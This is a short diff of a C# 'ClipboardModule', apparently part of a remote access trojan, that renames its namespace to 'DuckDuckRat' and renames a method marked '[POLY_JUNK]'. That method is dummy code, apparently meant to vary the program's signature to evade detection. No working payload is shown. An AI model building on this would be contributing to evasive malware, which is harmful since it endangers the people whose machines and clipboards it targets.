@@ -5,12 +5,12 @@ using System.Text;
 using System.Threading;
 using System.IO;
 
-namespace FinalBot.Modules
+namespace DuckDuckRat.Modules
 {
     public static class ClipboardModule
     {
         // [POLY_JUNK]
-        private static void _vanguard_f43b10c0() {
+        private static void _DuckDuckRat_f43b10c0() {
             int val = 51359;
             if (val > 50000) Console.WriteLine("Hash:" + 51359);
         }
@@ -113,3 +113,5 @@ namespace FinalBot.Modules
         }
     }
 }
+
+
